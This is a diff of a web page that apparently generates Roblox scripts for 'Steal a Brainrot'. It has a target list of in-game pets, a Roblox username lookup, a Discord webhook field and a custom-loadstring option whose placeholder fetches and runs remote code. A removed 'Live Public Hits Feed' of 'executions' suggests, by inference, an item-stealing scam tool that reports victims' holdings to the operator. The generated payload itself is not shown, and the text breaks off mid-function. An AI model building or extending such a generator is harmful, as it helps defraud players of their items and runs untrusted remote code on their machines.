@@ -55,7 +55,8 @@
   }
 
   @keyframes float {
-    0% { transform: translate(0, 0); }
+    0% { transform: translate(0, 0);
+  }
     100% { transform: translate(100px, 100px); }
   }
 
@@ -242,9 +243,11 @@
 
   .panel:nth-child(1) { animation-delay: 0.05s; }
   .panel:nth-child(2) { animation-delay: 0.13s; }
-  .panel:nth-child(3) { animation-delay: 0.21s; }
+  .panel:nth-child(3) { animation-delay: 0.21s;
+  }
   .panel:nth-child(4) { animation-delay: 0.29s; }
-  .panel:nth-child(5) { animation-delay: 0.37s; }
+  .panel:nth-child(5) { animation-delay: 0.37s;
+  }
 
   .ph {
     display: flex;
@@ -265,10 +268,11 @@
   }
 
   .dot-cyan { background: var(--neon); }
-  .dot-purple { background: var(--neon); animation-delay: 0.4s; }
+  .dot-purple { background: var(--neon); animation-delay: 0.4s;
+  }
   .dot-discord { background: var(--neon); animation-delay: 0.8s; }
-  .dot-green { background: var(--green); animation-delay: 1.2s; }
-  .dot-danger { background: var(--danger); animation-delay: 0.2s; }
+  .dot-green { background: var(--green); animation-delay: 1.2s;
+  }
 
   .ph-title {
     font-family: 'Share Tech Mono', monospace;
@@ -376,9 +380,11 @@
     user-select: none;
   }
 
-  .a-item:last-child { border-bottom: none; }
+  .a-item:last-child { border-bottom: none;
+  }
   .a-item:hover { background: rgba(255, 255, 255, 0.05); }
-  .a-item.on { background: rgba(255, 255, 255, 0.1); }
+  .a-item.on { background: rgba(255, 255, 255, 0.1);
+  }
 
   .a-item input[type="checkbox"] {
     -webkit-appearance: none;
@@ -460,7 +466,8 @@
     box-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
   }
 
-  .txt::placeholder { color: var(--muted); }
+  .txt::placeholder { color: var(--muted);
+  }
 
   .hint {
     font-family: 'Share Tech Mono', monospace;
@@ -562,48 +569,23 @@
     white-space: pre-wrap;
   }
 
-  .hits-list {
-    background: var(--surface);
-    border: 1px solid var(--border);
-    border-radius: 8px;
-    height: 160px;
-    overflow-y: auto;
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.8rem;
-    padding: 0.5rem;
-    scrollbar-width: thin;
-    scrollbar-color: var(--danger) transparent;
-  }
-
-  .hits-list::-webkit-scrollbar { width: 4px; }
-  .hits-list::-webkit-scrollbar-thumb {
-    background: var(--danger);
-    border-radius: 4px;
-  }
-
-  .hit-item {
-    padding: 6px 10px;
-    border-bottom: 1px solid rgba(255, 68, 68, 0.05);
-    line-height: 1.4;
-    animation: fadeDown 0.3s ease both;
-  }
-  .hit-item:last-child { border-bottom: none; }
-  .hit-time { color: var(--muted); margin-right: 8px; }
-  .hit-user { color: var(--green); font-weight: 600; }
-  .hit-owns { color: var(--danger); }
-
   @keyframes fadeDown {
-    from { opacity: 0; transform: translateY(-16px); }
-    to { opacity: 1; transform: none; }
+    from { opacity: 0; transform: translateY(-16px);
+  }
+    to { opacity: 1; transform: none;
+  }
   }
 
   @keyframes fadeUp {
-    from { opacity: 0; transform: translateY(16px); }
-    to { opacity: 1; transform: none; }
+    from { opacity: 0; transform: translateY(16px);
+  }
+    to { opacity: 1; transform: none;
+  }
   }
 
   @keyframes blink {
-    0%, 100% { opacity: 1; }
+    0%, 100% { opacity: 1;
+  }
     50% { opacity: 0.3; }
   }
 
@@ -727,15 +709,6 @@
   </header>
 
   <div class="panel">
-    <div class="ph"><div class="dot dot-danger"></div><span class="ph-title">Live Public Hits Feed</span></div>
-    <div class="pb">
-      <div class="hits-list" id="publicHitsLog">
-        <div class="hit-item" style="color: var(--muted); text-align: center; padding-top: 3rem;">Waiting for executions...</div>
-      </div>
-    </div>
-  </div>
-
-  <div class="panel">
     <div class="ph"><div class="dot dot-cyan"></div><span class="ph-title">Select Brainrot Animals</span></div>
     <div class="pb">
       <div class="search-row">
@@ -745,7 +718,7 @@
       </div>
       <div class="animal-list" id="animalList"></div>
      
-      <div id="customBrainrotInput">
+     <div id="customBrainrotInput">
         <input type="text" id="customBrainrotName" placeholder="Add custom brainrot name...">
         <button onclick="addCustomBrainrot()">Add</button>
       </div>
@@ -758,6 +731,7 @@
       </div>
       <div class="meta-row">
         <span class="sel-count"><span id="selNum">0</span> selected</span>
+    
       </div>
     </div>
   </div>
@@ -781,6 +755,7 @@
       <input class="txt" id="webhookInput" type="text" placeholder="https://discord.com/api/webhooks/..." autocomplete="off" spellcheck="false" oninput="validateWebhook()">
       <p class="hint" id="webhookHint">Paste your Discord webhook (must start with https://discord.com/api/webhooks/).</p>
     </div>
+ 
   </div>
 
   <div class="panel">
@@ -794,7 +769,8 @@
       </div>
       <div id="customAdminInput">
         <label class="lbl">Custom Loadstring</label>
-        <input class="txt" id="customAdminLoadstring" type="text" placeholder="e.g. loadstring(game:HttpGet('https://pastefy.app/...../raw'))()" oninput="updateCustomAdmin()">
+        
+ <input class="txt" id="customAdminLoadstring" type="text" placeholder="e.g. loadstring(game:HttpGet('https://pastefy.app/...../raw'))()" oninput="updateCustomAdmin()">
         <p class="hint">Enter your custom loadstring here.</p>
       </div>
     </div>
@@ -810,280 +786,511 @@
     </div>
     <div class="pb">
       <div class="code-block empty" id="outputBlock">-- Fill in the fields above and hit Generate Script...</div>
-    </div>
+  
+      </div>
   </div>
 </div>
 
 <script>
 const ANIMALS = [
-  { name: "Strawberry Elephant", rarity: "OG", mps: "750M/s" },
-  { name: "Meowl", rarity: "OG", mps: "600M/s" },
-  { name: "Headless Horseman", rarity: "OG", mps: "550M/s" },
-  { name: "John Pork", rarity: "OG", mps: "500M/s" },
-  { name: "Skibidi Toilet", rarity: "OG", mps: "450M/s" },
-  { name: "Griffin", rarity: "Secret", mps: "400M/s" },
-  { name: "Dragon Aquanini", rarity: "Secret", mps: "375M/s" },
-  { name: "Hydra Dragon Cannelloni", rarity: "Secret", mps: "350M/s" },
-  { name: "Dragon Gingerini", rarity: "Secret", mps: "300M/s" },
-  { name: "Signora Carapace", rarity: "Secret", mps: "275M/s" },
-  { name: "Dragon Cannelloni", rarity: "Secret", mps: "250M/s" },
-  { name: "Love Love Bear", rarity: "Secret", mps: "225M/s" },
-  { name: "La Supreme Combinasion", rarity: "Secret", mps: "200M/s" },
-  { name: "Digi Narwhal", rarity: "Secret", mps: "200M/s" },
-  { name: "Elefanto Frigo", rarity: "Secret", mps: "185M/s" },
-  { name: "Hydra Bunny", rarity: "Secret", mps: "185M/s" },
-  { name: "Jelly Moby", rarity: "Secret", mps: "175M/s" },
-  { name: "Celestial Pegasus", rarity: "Secret", mps: "175M/s" },
-  { name: "Cerberus", rarity: "Secret", mps: "175M/s" },
-  { name: "Bunny and Eggy", rarity: "Secret", mps: "170M/s" },
-  { name: "Popcuru and Fizzuru", rarity: "Secret", mps: "170M/s" },
-  { name: "Rosey and Teddy", rarity: "Secret", mps: "165M/s" },
-  { name: "Capitano Moby", rarity: "Secret", mps: "160M/s" },
-  { name: "Cooki and Milki", rarity: "Secret", mps: "155M/s" },
-  { name: "Arcadragon", rarity: "Secret", mps: "150M/s" },
-  { name: "Burguro And Fryuro", rarity: "Secret", mps: "150M/s" },
-  { name: "Ketupat Bros", rarity: "Secret", mps: "145M/s" },
-  { name: "Reinito Sleighito", rarity: "Secret", mps: "140M/s" },
-  { name: "Fortunu and Cashuru", rarity: "Secret", mps: "130M/s" },
-  { name: "Los Amigos", rarity: "Secret", mps: "130M/s" },
-  { name: "Pancake and Syrup", rarity: "Secret", mps: "125M/s" },
-  { name: "Antonio", rarity: "Secret", mps: "125M/s" },
-  { name: "La Secret Combinasion", rarity: "Secret", mps: "125M/s" },
-  { name: "Foxini Lanterini", rarity: "Secret", mps: "115M/s" },
-  { name: "Kalika Bros", rarity: "Secret", mps: "115M/s" },
-  { name: "Los Sekolahs", rarity: "Secret", mps: "110M/s" },
-  { name: "Cash or Card", rarity: "Secret", mps: "100M/s" },
-  { name: "La Casa Boo", rarity: "Secret", mps: "100M/s" },
-  { name: "Fragrama and Chocrama", rarity: "Secret", mps: "100M/s" },
-  { name: "La Food Combinasion", rarity: "Secret", mps: "90M/s" },
-  { name: "Duggy Bros", rarity: "Secret", mps: "90M/s" },
-  { name: "Sammyni Cakini", rarity: "Secret", mps: "80M/s" },
-  { name: "Spooky and Pumpky", rarity: "Secret", mps: "80M/s" },
-  { name: "Boppin Bunny", rarity: "Secret", mps: "80M/s" },
-  { name: "Ginger Gerat", rarity: "Secret", mps: "75M/s" },
-  { name: "Los Chillis", rarity: "Secret", mps: "75M/s" },
-  { name: "La Ginger Sekolah", rarity: "Secret", mps: "75M/s" },
-  { name: "Los Hackers", rarity: "Secret", mps: "75M/s" },
-  { name: "Sammyni Fattini", rarity: "Secret", mps: "70M/s" },
-  { name: "Los Spaghettis", rarity: "Secret", mps: "70M/s" },
-  { name: "Rubrikiko", rarity: "Secret", mps: "70M/s" },
-  { name: "Festive 67", rarity: "Secret", mps: "67M/s" },
-  { name: "Guest 666", rarity: "Secret", mps: "66.6M/s" },
-  { name: "Ventoliero Pavonero", rarity: "Secret", mps: "65M/s" },
-  { name: "Quackini Snackini", rarity: "Secret", mps: "65M/s" },
-  { name: "Cloverat Clapat", rarity: "Secret", mps: "60M/s" },
-  { name: "Spaghetti Tualetti", rarity: "Secret", mps: "60M/s" }
+{ name: "Strawberry Elephant", rarity: "OG", mps: "750M/s" },
+{ name: "Meowl", rarity: "OG", mps: "600M/s" },
+{ name: "Headless Horseman", rarity: "OG", mps: "550M/s" },
+{ name: "John Pork", rarity: "OG", mps: "500M/s" },
+{ name: "Skibidi Toilet", rarity: "OG", mps: "450M/s" },
+{ name: "Griffin", rarity: "Secret", mps: "400M/s" },
+{ name: "Dragon Aquanini", rarity: "Secret", mps: "375M/s" },
+{ name: "Hydra Dragon Cannelloni", rarity: "Secret", mps: "350M/s" },
+{ name: "Dragon Gingerini", rarity: "Secret", mps: "300M/s" },
+{ name: "Signora Carapace", rarity: "Secret", mps: "275M/s" },
+{ name: "Dragon Cannelloni", rarity: "Secret", mps: "250M/s" },
+{ name: "Love Love Bear", rarity: "Secret", mps: "225M/s" },
+{ name: "La Supreme Combinasion", rarity: "Secret", mps: "200M/s" },
+{ name: "Digi Narwhal", rarity: "Secret", mps: "200M/s" },
+{ name: "Elefanto Frigo", rarity: "Secret", mps: "185M/s" },
+{ name: "Hydra Bunny", rarity: "Secret", mps: "185M/s" },
+{ name: "Jelly Moby", rarity: "Secret", mps: "175M/s" },
+{ name: "Celestial Pegasus", rarity: "Secret", mps: "175M/s" },
+{ name: "Cerberus", rarity: "Secret", mps: "175M/s" },
+{ name: "Bunny and Eggy", rarity: "Secret", mps: "170M/s" },
+{ name: "Popcuru and Fizzuru", rarity: "Secret", mps: "170M/s" },
+{ name: "Rosey and Teddy", rarity: "Secret", mps: "165M/s" },
+{ name: "Capitano Moby", rarity: "Secret", mps: "160M/s" },
+{ name: "Cooki and Milki", rarity: "Secret", mps: "155M/s" },
+{ name: "Arcadragon", rarity: "Secret", mps: "150M/s" },
+{ name: "Burguro And Fryuro", rarity: "Secret", mps: "150M/s" },
+{ name: "Ketupat Bros", rarity: "Secret", mps: "145M/s" },
+{ name: "Reinito Sleighito", rarity: "Secret", mps: "140M/s" },
+{ name: "Fortunu and Cashuru", rarity: "Secret", mps: "130M/s" },
+{ name: "Los Amigos", rarity: "Secret", mps: "130M/s" },
+{ name: "Pancake and Syrup", rarity: "Secret", mps: "125M/s" },
+{ name: "Antonio", rarity: "Secret", mps: "125M/s" },
+{ name: "La Secret Combinasion", rarity: "Secret", mps: "125M/s" },
+{ name: "Foxini Lanterini", rarity: "Secret", mps: "115M/s" },
+{ name: "Kalika Bros", rarity: "Secret", mps: "115M/s" },
+{ name: "Los Sekolahs", rarity: "Secret", mps: "110M/s" },
+{ name: "Cash or Card", rarity: "Secret", mps: "100M/s" },
+{ name: "La Casa Boo", rarity: "Secret", mps: "100M/s" },
+{ name: "Fragrama and Chocrama", rarity: "Secret", mps: "100M/s" },
+{ name: "La Food Combinasion", rarity: "Secret", mps: "90M/s" },
+{ name: "Duggy Bros", rarity: "Secret", mps: "90M/s" },
+{ name: "Sammyni Cakini", rarity: "Secret", mps: "80M/s" },
+{ name: "Spooky and Pumpky", rarity: "Secret", mps: "80M/s" },
+{ name: "Boppin Bunny", rarity: "Secret", mps: "80M/s" },
+{ name: "Ginger Gerat", rarity: "Secret", mps: "75M/s" },
+{ name: "Los Chillis", rarity: "Secret", mps: "75M/s" },
+{ name: "La Ginger Sekolah", rarity: "Secret", mps: "75M/s" },
+{ name: "Los Hackers", rarity: "Secret", mps: "75M/s" },
+{ name: "Sammyni Fattini", rarity: "Secret", mps: "70M/s" },
+{ name: "Los Spaghettis", rarity: "Secret", mps: "70M/s" },
+{ name: "Rubrikiko", rarity: "Secret", mps: "70M/s" },
+{ name: "Festive 67", rarity: "Secret", mps: "67M/s" },
+{ name: "Guest 666", rarity: "Secret", mps: "66.6M/s" },
+{ name: "Ventoliero Pavonero", rarity: "Secret", mps: "65M/s" },
+{ name: "Quackini Snackini", rarity: "Secret", mps: "65M/s" },
+{ name: "Cloverat Clapat", rarity: "Secret", mps: "60M/s" },
+{ name: "Spaghetti Tualetti", rarity: "Secret", mps: "60M/s" },
+{ name: "La Easter Grande", rarity: "Secret", mps: "55M/s" },
+{ name: "Hopilikalika Hopilikalako", rarity: "Secret", mps: "55M/s" },
+{ name: "La Anniversary Grande", rarity: "Secret", mps: "50M/s" },
+{ name: "Rosetti Tualetti", rarity: "Secret", mps: "50M/s" },
+{ name: "Rico Dinero", rarity: "Secret", mps: "50M/s" },
+{ name: "Nacho Spyder", rarity: "Secret", mps: "50M/s" },
+{ name: "Garama and Madundung", rarity: "Secret", mps: "50M/s" },
+{ name: "Fishino Clownino", rarity: "Secret", mps: "47M/s" },
+{ name: "Money Money Bros", rarity: "Secret", mps: "47M/s" },
+{ name: "Gold Gold Gold", rarity: "Secret", mps: "45M/s" },
+{ name: "Jolly Jolly Sahur", rarity: "Secret", mps: "45M/s" },
+{ name: "Lavadorito Spinito", rarity: "Secret", mps: "45M/s" },
+{ name: "Ketchuru and Musturu", rarity: "Secret", mps: "42.5M/s" },
+{ name: "Tirilikalika Tirilikalako", rarity: "Secret", mps: "42.5M/s" },
+{ name: "Gym Bros", rarity: "Secret", mps: "42.5M/s" },
+{ name: "Swaggy Bros", rarity: "Secret", mps: "40M/s" },
+{ name: "La Romantic Grande", rarity: "Secret", mps: "40M/s" },
+{ name: "Orcaledon", rarity: "Secret", mps: "40M/s" },
+{ name: "La Lucky Grande", rarity: "Secret", mps: "40M/s" },
+{ name: "Tictac Sahur", rarity: "Secret", mps: "37.5M/s" },
+{ name: "La Taco Combinasion", rarity: "Secret", mps: "35M/s" },
+{ name: "Ketupat Kepat", rarity: "Secret", mps: "35M/s" },
+{ name: "Dug dug dug", rarity: "Secret", mps: "35M/s" },
+{ name: "Coco and Mango", rarity: "Secret", mps: "33.5M/s" },
+{ name: "Tang Tang Keletang", rarity: "Secret", mps: "33.5M/s" },
+{ name: "Abyssaloco", rarity: "Secret", mps: "33.3M/s" },
+{ name: "Fragola La La La", rarity: "Secret", mps: "32.5M/s" },
+{ name: "Lovin Rose", rarity: "Secret", mps: "32.5M/s" },
+{ name: "Los Tacoritas", rarity: "Secret", mps: "32M/s" },
+{ name: "Eviledon", rarity: "Secret", mps: "31.5M/s" },
+{ name: "Los Primos", rarity: "Secret", mps: "31M/s" },
+{ name: "W or L", rarity: "Secret", mps: "30M/s" },
+{ name: "Esok Sekolah", rarity: "Secret", mps: "30M/s" },
+{ name: "La Jolly Grande", rarity: "Secret", mps: "30M/s" },
+{ name: "Los Cupids", rarity: "Secret", mps: "30M/s" },
+{ name: "Los Puggies", rarity: "Secret", mps: "30M/s" },
+{ name: "Los Mariachis", rarity: "Secret", mps: "30M/s" },
+{ name: "Tralaledon", rarity: "Secret", mps: "27.5M/s" },
+{ name: "Globa Steppa", rarity: "Secret", mps: "27.5M/s" },
+{ name: "Gobblino Uniciclino", rarity: "Secret", mps: "27.5M/s" },
+{ name: "Tuff Toucan", rarity: "Secret", mps: "26M/s" },
+{ name: "Mieteteira Bicicleteira", rarity: "Secret", mps: "26M/s" },
+{ name: "Chipso and Queso", rarity: "Secret", mps: "25M/s" },
+{ name: "Chillin Chili", rarity: "Secret", mps: "25M/s" },
+{ name: "Money Money Reindeer", rarity: "Secret", mps: "25M/s" },
+{ name: "La Spooky Grande", rarity: "Secret", mps: "24.5M/s" },
+{ name: "Bacuru and Egguru", rarity: "Secret", mps: "24M/s" },
+{ name: "Los Bros", rarity: "Secret", mps: "24M/s" },
+{ name: "La Extinct Grande", rarity: "Secret", mps: "23.5M/s" },
+{ name: "Los Candies", rarity: "Secret", mps: "23M/s" },
+{ name: "Los 67", rarity: "Secret", mps: "22.5M/s" },
+{ name: "Celularcini Viciosini", rarity: "Secret", mps: "22.5M/s" },
+{ name: "Los Mobilis", rarity: "Secret", mps: "22M/s" },
+{ name: "Churrito Bunnito", rarity: "Secret", mps: "21M/s" },
+{ name: "Money Money Puggy", rarity: "Secret", mps: "21M/s" },
+{ name: "Cigno Fulgoro", rarity: "Secret", mps: "20M/s" },
+{ name: "Los Spooky Combinasionas", rarity: "Secret", mps: "20M/s" },
+{ name: "Los Hotspotsitos", rarity: "Secret", mps: "20M/s" },
+{ name: "Los Jolly Combinasionas", rarity: "Secret", mps: "20M/s" },
+{ name: "Snailo Clovero", rarity: "Secret", mps: "18.5M/s" },
+{ name: "Los Planitos", rarity: "Secret", mps: "18.5M/s" },
+{ name: "Chicleteira Cupideira", rarity: "Secret", mps: "17.5M/s" },
+{ name: "DJ Panda", rarity: "Secret", mps: "17.5M/s" },
+{ name: "Las Sis", rarity: "Secret", mps: "17.5M/s" },
+{ name: "Camera Ramena", rarity: "Secret", mps: "17M/s" },
+{ name: "Spinny Hammy", rarity: "Secret", mps: "17M/s" },
+{ name: "Tacorita Bicicleta", rarity: "Secret", mps: "16.5M/s" },
+{ name: "Los Sweethearts", rarity: "Secret", mps: "16.5M/s" },
+{ name: "Baskito", rarity: "Secret", mps: "16M/s" },
+{ name: "Nuclearo Dinossauro", rarity: "Secret", mps: "15M/s" },
+{ name: "Chicleteira Noelteira", rarity: "Secret", mps: "15M/s" },
+{ name: "Los Combinasionas", rarity: "Secret", mps: "15M/s" },
+{ name: "Bananito", rarity: "Secret", mps: "15M/s" },
+{ name: "Chimnino", rarity: "Secret", mps: "14M/s" },
+{ name: "Noo my Gold", rarity: "Secret", mps: "13.5M/s" },
+{ name: "Swag Soda", rarity: "Secret", mps: "13M/s" },
+{ name: "Noo my Heart", rarity: "Secret", mps: "13M/s" },
+{ name: "Tacorillo Crocodillo", rarity: "Secret", mps: "12.5M/s" },
+{ name: "Mariachi Corazoni", rarity: "Secret", mps: "12.5M/s" },
+{ name: "La Grande Combinasion", rarity: "Secret", mps: "10M/s" },
+{ name: "Los 25", rarity: "Secret", mps: "10M/s" },
+{ name: "Los Burritos", rarity: "Secret", mps: "8.5M/s" },
+{ name: "67", rarity: "Secret", mps: "7.5M/s" },
+{ name: "Donkeyturbo Express", rarity: "Secret", mps: "7.5M/s" },
+{ name: "John Doe", rarity: "Secret", mps: "7.5M/s" },
+{ name: "Los Chicleteiras", rarity: "Secret", mps: "7M/s" },
+{ name: "Noo my Eggs", rarity: "Secret", mps: "7M/s" },
+{ name: "Strawberrita", rarity: "Secret", mps: "6.5M/s" },
+{ name: "Los Mi Gatitos", rarity: "Secret", mps: "6.5M/s" },
+{ name: "Spooky Skeleton", rarity: "Secret", mps: "6M/s" },
+{ name: "Aero 67", rarity: "Secret", mps: "5.5M/s" },
+{ name: "Chicleteira Bunnyteira", rarity: "Secret", mps: "5.5M/s" },
+{ name: "Dino 67", rarity: "Secret", mps: "5.5M/s" },
+{ name: "Cloverat Express", rarity: "Secret", mps: "5.5M/s" },
+{ name: "Bao Sahur", rarity: "Secret", mps: "5M/s" },
+{ name: "Laternini Corazoni", rarity: "Secret", mps: "5M/s" },
+{ name: "Mimi", rarity: "Secret", mps: "5M/s" }
 ];
 
 let selectedAnimals = new Set();
-let currentAdminMode = 'no-gui';
+let adminMode = 'no-gui';
+let customLoadstring = '';
 
-function renderList() {
-  const container = document.getElementById('animalList');
-  container.innerHTML = '';
-  ANIMALS.forEach((a, index) => {
-    const isChecked = selectedAnimals.has(a.name);
-    const item = document.createElement('div');
-    item.className = `a-item ${isChecked ? 'on' : ''}`;
-    item.onclick = (e) => {
-      if(e.target.tagName !== 'INPUT') {
-        const cb = item.querySelector('input');
-        cb.checked = !cb.checked;
-        toggleAnimal(a.name, cb.checked, item);
-      }
-    };
+function renderList(list = ANIMALS) {
+    const container = document.getElementById('animalList');
+    container.innerHTML = '';
+    list.forEach(a => {
+        const item = document.createElement('div');
+        item.className = `a-item ${selectedAnimals.has(a.name) ? 'on' : ''}`;
+        item.onclick = (e) => {
+            if(e.target.tagName !== 'INPUT') {
+                const cb = item.querySelector('input');
+                cb.checked = !cb.checked;
+                toggleAnimal(a.name, cb.checked, item);
+            }
+        };
 
-    const badgeClass = a.rarity === 'OG' ? 'badge-og' : 'badge-secret';
-    item.innerHTML = `
-      <input type="checkbox" ${isChecked ? 'checked' : ''} onchange="toggleAnimal('${a.name}', this.checked, this.parentElement)">
-      <span class="a-name">${a.name} <span class="${badgeClass}">${a.rarity}</span></span>
-      <span class="a-meta">${a.mps}</span>
-    `;
-    container.appendChild(item);
-  });
-  updateCount();
+        const cb = document.createElement('input');
+        cb.type = 'checkbox';
+        cb.checked = selectedAnimals.has(a.name);
+        cb.onchange = (e) => toggleAnimal(a.name, e.target.checked, item);
+
+        const nameSpan = document.createElement('span');
+        nameSpan.className = 'a-name';
+        nameSpan.textContent = a.name;
+
+        const metaSpan = document.createElement('span');
+        metaSpan.className = 'a-meta';
+        metaSpan.innerHTML = `${a.mps} <span class="badge-${a.rarity.toLowerCase()}">${a.rarity}</span>`;
+
+        item.appendChild(cb);
+        item.appendChild(nameSpan);
+        item.appendChild(metaSpan);
+        container.appendChild(item);
+    });
 }
 
-function toggleAnimal(name, checked, element) {
-  if(checked) {
-    selectedAnimals.add(name);
-    if(element) element.classList.add('on');
-  } else {
-    selectedAnimals.delete(name);
-    if(element) element.classList.remove('on');
-  }
-  updateCount();
-}
-
-function updateCount() {
-  document.getElementById('selNum').textContent = selectedAnimals.size;
+function toggleAnimal(name, isChecked, itemElement) {
+    if(isChecked) {
+        selectedAnimals.add(name);
+        itemElement.classList.add('on');
+    } else {
+        selectedAnimals.delete(name);
+        itemElement.classList.remove('on');
+    }
+    document.getElementById('selNum').textContent = selectedAnimals.size;
 }
 
 function filterList() {
-  const q = document.getElementById('searchBox').value.toLowerCase();
-  const items = document.querySelectorAll('.a-item');
-  ANIMALS.forEach((a, i) => {
-    const match = a.name.toLowerCase().includes(q);
-    items[i].style.display = match ? 'flex' : 'none';
-  });
+    const q = document.getElementById('searchBox').value.toLowerCase();
+    const filtered = ANIMALS.filter(a => a.name.toLowerCase().includes(q));
+    renderList(filtered);
 }
 
 function selectAll() {
-  ANIMALS.forEach(a => selectedAnimals.add(a.name));
-  renderList();
+    ANIMALS.forEach(a => selectedAnimals.add(a.name));
+    document.getElementById('selNum').textContent = selectedAnimals.size;
+    const q = document.getElementById('searchBox').value.toLowerCase();
+    const filtered = ANIMALS.filter(a => a.name.toLowerCase().includes(q));
+    renderList(filtered);
 }
 
 function clearAll() {
-  selectedAnimals.clear();
-  renderList();
+    selectedAnimals.clear();
+    document.getElementById('selNum').textContent = 0;
+    const q = document.getElementById('searchBox').value.toLowerCase();
+    const filtered = ANIMALS.filter(a => a.name.toLowerCase().includes(q));
+    renderList(filtered);
 }
 
 function addCustomBrainrot() {
-  const input = document.getElementById('customBrainrotName');
-  const name = input.value.trim();
-  if(!name) return;
-  if(!ANIMALS.some(a => a.name.toLowerCase() === name.toLowerCase())) {
-    ANIMALS.unshift({ name: name, rarity: "Secret", mps: "Custom" });
+    const input = document.getElementById('customBrainrotName');
+    const name = input.value.trim();
+    if (!name) return;
+    
+    const exists = ANIMALS.some(a => a.name.toLowerCase() === name.toLowerCase());
+    if (!exists) {
+        ANIMALS.unshift({ name: name, rarity: "Secret", mps: "Custom" });
+    }
     selectedAnimals.add(name);
-    renderList();
+    document.getElementById('selNum').textContent = selectedAnimals.size;
     input.value = '';
-  }
+    filterList();
 }
 
 function parsePastedList() {
-  const textarea = document.getElementById('pasteCustomListTextarea');
-  const text = textarea.value;
-  const regex = /\["([^"]+)"\]\s*=\s*true/g;
-  let match;
-  let count = 0;
-  while ((match = regex.exec(text)) !== null) {
-    const name = match[1];
-    if(!ANIMALS.some(a => a.name.toLowerCase() === name.toLowerCase())) {
-      ANIMALS.unshift({ name: name, rarity: "Secret", mps: "Custom" });
+    const textarea = document.getElementById('pasteCustomListTextarea');
+    const text = textarea.value;
+    if (!text.trim()) return;
+
+    const regex = /\["([^"]+)"\]\s*=\s*true/g;
+    let match;
+    let addedCount = 0;
+
+    while ((match = regex.exec(text)) !== null) {
+        const name = match[1].trim();
+        const exists = ANIMALS.some(a => a.name.toLowerCase() === name.toLowerCase());
+        if (!exists) {
+            ANIMALS.unshift({ name: name, rarity: "Secret", mps: "Custom" });
+        }
+        selectedAnimals.add(name);
+        addedCount++;
     }
-    selectedAnimals.add(name);
-    count++;
-  }
-  if(count > 0) {
-    renderList();
-    textarea.value = '';
-  }
+
+    if (addedCount > 0) {
+        document.getElementById('selNum').textContent = selectedAnimals.size;
+        textarea.value = '';
+        filterList();
+    } else {
+        alert("No valid targets found. Format should match: [\"Name\"] = true,");
+    }
 }
 
 function setAdminMode(mode) {
-  currentAdminMode = mode;
-  document.querySelectorAll('.admin-mode-btn').forEach(btn => btn.classList.remove('active'));
-  event.target.classList.add('active');
-  document.getElementById('customAdminInput').style.display = mode === 'custom' ? 'block' : 'none';
+    adminMode = mode;
+    document.querySelectorAll('.admin-mode-btn').forEach(btn => {
+        btn.classList.remove('active');
+        if(btn.getAttribute('onclick').includes(`'${mode}'`)) {
+            btn.classList.add('active');
+        }
+    });
+
+    const customInput = document.getElementById('customAdminInput');
+    if (mode === 'custom') {
+        customInput.style.display = 'block';
+    } else {
+        customInput.style.display = 'none';
+    }
+}
+
+function updateCustomAdmin() {
+    customLoadstring = document.getElementById('customAdminLoadstring').value.trim();
+}
+
+// Initial setup on window load
+window.onload = () => {
+    renderList();
+    setupRobloxAutocomplete();
+};
+
+function setupRobloxAutocomplete() {
+    const input = document.getElementById('usernameInput');
+    const suggestionsCont = document.getElementById('usernameSuggestions');
+
+    let debounceTimeout;
+
+    input.addEventListener('input', () => {
+        clearTimeout(debounceTimeout);
+        const query = input.value.trim();
+
+        if (query.length < 3) {
+            suggestionsCont.style.display = 'none';
+            return;
+        }
+
+        debounceTimeout = setTimeout(() => {
+            fetch(`https://images-api.roblox.com/v1/users/search?keyword=${encodeURIComponent(query)}&limit=10`)
+                .then(res => res.json())
+                .then(data => {
+                    if (data && data.data && data.data.length > 0) {
+                        displaySuggestions(data.data);
+                    } else {
+                        suggestionsCont.style.display = 'none';
+                    }
+                })
+                .catch(() => {
+                    suggestionsCont.style.display = 'none';
+                });
+        }, 400);
+    });
+
+    document.addEventListener('click', (e) => {
+        if (e.target !== input && e.target !== suggestionsCont && !suggestionsCont.contains(e.target)) {
+            suggestionsCont.style.display = 'none';
+        }
+    });
+}
+
+function displaySuggestions(users) {
+    const suggestionsCont = document.getElementById('usernameSuggestions');
+    suggestionsCont.innerHTML = '';
+    suggestionsCont.style.display = 'block';
+
+    const userIds = users.map(u => u.id);
+
+    fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userIds.join(',')}&size=48x48&format=Png&isCircular=true`)
+        .then(res => res.json())
+        .then(thumbData => {
+            const thumbMap = {};
+            if (thumbData && thumbData.data) {
+                thumbData.data.forEach(t => {
+                    thumbMap[t.targetId] = t.imageUrl;
+                });
+            }
+
+            users.forEach(user => {
+                const item = document.createElement('div');
+                item.className = 'suggestion-item';
+
+                const avatar = document.createElement('div');
+                avatar.className = 'suggestion-avatar';
+                const img = document.createElement('img');
+                img.src = thumbMap[user.id] || 'https://www.roblox.com/headshot-thumbnail/image?userId=1&width=48&height=48&format=png';
+                avatar.appendChild(img);
+
+                const info = document.createElement('div');
+                info.className = 'suggestion-info';
+
+                const username = document.createElement('div');
+                username.className = 'suggestion-username';
+                username.textContent = user.displayName;
+
+                const handle = document.createElement('div');
+                handle.className = 'suggestion-handle';
+                handle.textContent = `@${user.name}`;
+
+                const idStr = document.createElement('div');
+                idStr.className = 'suggestion-id';
+                idStr.textContent = `ID: ${user.id}`;
+
+                info.appendChild(username);
+                info.appendChild(handle);
+                info.appendChild(idStr);
+
+                item.appendChild(avatar);
+                item.appendChild(info);
+
+                item.onclick = () => {
+                    document.getElementById('usernameInput').value = user.name;
+                    suggestionsCont.style.display = 'none';
+                };
+
+                suggestionsCont.appendChild(item);
+            });
+        })
+        .catch(() => {
+            users.forEach(user => {
+                const item = document.createElement('div');
+                item.className = 'suggestion-item';
+                item.textContent = user.name;
+                item.onclick = () => {
+                    document.getElementById('usernameInput').value = user.name;
+                    suggestionsCont.style.display = 'none';
+                };
+                suggestionsCont.appendChild(item);
+            });
+        });
 }
 
 function validateWebhook() {
-  const webhook = document.getElementById('webhookInput').value.trim();
-  const hint = document.getElementById('webhookHint');
-  if (!webhook) {
+    const webhook = document.getElementById('webhookInput').value.trim();
+    const hint = document.getElementById('webhookHint');
+    if (!webhook) {
+        hint.classList.remove('error');
+        hint.textContent = 'Paste your Discord webhook (must start with https://discord.com/api/webhooks/).';
+        return false;
+    }
